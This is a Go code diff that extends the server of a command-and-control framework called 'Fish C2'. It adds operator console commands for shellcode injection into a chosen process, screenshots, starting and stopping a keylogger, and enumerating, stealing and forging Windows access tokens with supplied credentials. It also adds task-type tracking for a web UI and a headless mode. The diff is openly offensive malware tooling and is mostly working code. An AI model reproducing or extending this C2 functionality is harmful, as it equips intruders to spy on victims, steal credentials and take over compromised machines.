@@ -18,6 +18,30 @@ import (
 	"github.com/gorilla/websocket"
 )
 
+// TaskType反向映射 (uint16 -> string)
+var taskTypeStr = map[encode.TaskType]string{
+	encode.TaskExecCmd:    "exec",
+	encode.TaskExecPS:     "ps",
+	encode.TaskSysInfo:    "sysinfo",
+	encode.TaskPrivInfo:   "privinfo",
+	encode.TaskListDir:    "listdir",
+	encode.TaskProcList:   "proclist",
+	encode.TaskProcKill:   "kill",
+	encode.TaskFileDelete: "filedel",
+	encode.TaskFileRead:   "fileread",
+	encode.TaskFileWrite:  "filewrite",
+	encode.TaskPayload:    "payload",
+	encode.TaskInject:     "inject",
+	encode.TaskScreenshot: "screenshot",
+	encode.TaskKeylogOn:   "keylogon",
+	encode.TaskKeylogOff:  "keylogoff",
+	encode.TaskTokenEnum:  "tokens",
+	encode.TaskTokenSteal: "steal_token",
+	encode.TaskTokenRev2:  "rev2self",
+	encode.TaskTokenMake:  "make_token",
+	encode.TaskExit:       "exit",
+}
+
 // Session client session
 type Session struct {
 	ID        string
@@ -38,6 +62,7 @@ type Server struct {
 	mu            sync.Mutex
 	nextTaskID    uint32
 	taskResults   map[uint32]*encode.TaskResp
+	taskTypes     map[uint32]encode.TaskType // taskID -> taskType 映射，用于WS广播
 	activeSession string
 	wsClients     map[*websocket.Conn]bool
 	wsMu          sync.Mutex
@@ -48,6 +73,7 @@ func NewServer() *Server {
 	s := &Server{
 		sessions:    make(map[string]*Session),
 		taskResults: make(map[uint32]*encode.TaskResp),
+		taskTypes:   make(map[uint32]encode.TaskType),
 		wsClients:   make(map[*websocket.Conn]bool),
 		eventCh:     make(chan WSEvent, 100),
 	}
@@ -205,12 +231,17 @@ func (s *Server) handleSessionCallback(sessionID string, pkt *encode.Packet, w h
 			sessionID, resp.TaskID, resp.Success, resp.Output)
 		s.taskResults[resp.TaskID] = &resp
 
-		// WebSocket广播任务结果
+		// WebSocket广播任务结果 (包含task_type用于前端路由)
+		taskType := ""
+		if tt, ok := s.taskTypes[resp.TaskID]; ok {
+			taskType = taskTypeStr[tt]
+		}
 		s.broadcastEvent(WSEvent{
 			Type: "task_result",
 			Data: map[string]interface{}{
 				"task_id":    resp.TaskID,
 				"session_id": sessionID,
+				"task_type":  taskType,
 				"success":    resp.Success,
 				"output":     resp.Output,
 				"error":      resp.Error,
@@ -223,6 +254,7 @@ func (s *Server) handleSessionCallback(sessionID string, pkt *encode.Packet, w h
 		session.TaskQueue = session.TaskQueue[1:]
 		taskID := s.nextTaskID
 		s.nextTaskID++
+		s.taskTypes[taskID] = task.TaskType // 记录taskType
 
 		taskJSON, _ := json.Marshal(task)
 		respPkt := &encode.Packet{
@@ -270,7 +302,7 @@ func truncate(s string, max int) string {
 // Console commands
 func (s *Server) handleConsole() {
 	fmt.Println("Fish C2 Server Console")
-	fmt.Println("Commands: sessions, use <id>, exec <cmd>, ps <cmd>, listdir <path>, sysinfo, privinfo, proclist, kill <pid>, exit")
+	fmt.Println("Commands: sessions, use <id>, exec <cmd>, ps <cmd>, listdir <path>, sysinfo, privinfo, proclist, kill <pid>, inject <pid> <b64>, screenshot, keylogon, keylogoff, exit")
 	fmt.Print("> ")
 
 	reader := bufio.NewReader(os.Stdin)
@@ -333,6 +365,82 @@ func (s *Server) handleConsole() {
 			s.pushTaskActive(&encode.TaskReq{
 				TaskType: encode.TaskExecPS,
 				Params:   map[string]string{"command": parts[1]},
+			})
+
+		case "inject":
+			if len(parts) < 3 {
+				fmt.Println("Usage: inject <pid> <shellcode_base64>")
+				fmt.Println("  or:  inject <pid> self  (test with self-injection)")
+				fmt.Print("> ")
+				continue
+			}
+			s.pushTaskActive(&encode.TaskReq{
+				TaskType: encode.TaskInject,
+				Params:   map[string]string{"pid": parts[1], "shellcode": parts[2]},
+			})
+
+		case "screenshot":
+			s.pushTaskActive(&encode.TaskReq{
+				TaskType: encode.TaskScreenshot,
+				Params:   map[string]string{},
+			})
+
+		case "keylogon":
+			s.pushTaskActive(&encode.TaskReq{
+				TaskType: encode.TaskKeylogOn,
+				Params:   map[string]string{},
+			})
+
+		case "keylogoff":
+			s.pushTaskActive(&encode.TaskReq{
+				TaskType: encode.TaskKeylogOff,
+				Params:   map[string]string{},
+			})
+
+		case "tokens":
+			s.pushTaskActive(&encode.TaskReq{
+				TaskType: encode.TaskTokenEnum,
+				Params:   map[string]string{"action": "enum"},
+			})
+
+		case "steal-token":
+			if len(parts) < 2 {
+				fmt.Println("Usage: steal-token <pid>")
+				fmt.Print("> ")
+				continue
+			}
+			s.pushTaskActive(&encode.TaskReq{
+				TaskType: encode.TaskTokenSteal,
+				Params:   map[string]string{"action": "steal", "pid": parts[1]},
+			})
+
+		case "rev2self":
+			s.pushTaskActive(&encode.TaskReq{
+				TaskType: encode.TaskTokenRev2,
+				Params:   map[string]string{"action": "rev2self"},
+			})
+
+		case "make-token":
+			if len(parts) < 3 {
+				fmt.Println("Usage: make-token <domain\\user> <password>")
+				fmt.Print("> ")
+				continue
+			}
+			userParts := strings.SplitN(parts[1], "\\", 2)
+			domain := "."
+			user := parts[1]
+			if len(userParts) == 2 {
+				domain = userParts[0]
+				user = userParts[1]
+			}
+			s.pushTaskActive(&encode.TaskReq{
+				TaskType: encode.TaskTokenMake,
+				Params: map[string]string{
+					"action": "make",
+					"domain": domain,
+					"user":   user,
+					"pass":   parts[2],
+				},
 			})
 
 		case "sysinfo":
@@ -448,7 +556,12 @@ func main() {
 	http.HandleFunc("/admin/files/download", webUI.authMiddleware(webUI.handleFileDownloadAPI))
 	http.HandleFunc("/admin/files/upload", webUI.authMiddleware(webUI.handleFileUploadAPI))
 
-	go server.handleConsole()
+	// 仅在交互终端中启用控制台（非管道模式下跳过）
+	if isTerminal() {
+		go server.handleConsole()
+	} else {
+		log.Println("[+] Headless mode — console disabled, use Web UI")
+	}
 
 	addr := ":8443"
 	if len(os.Args) > 1 {
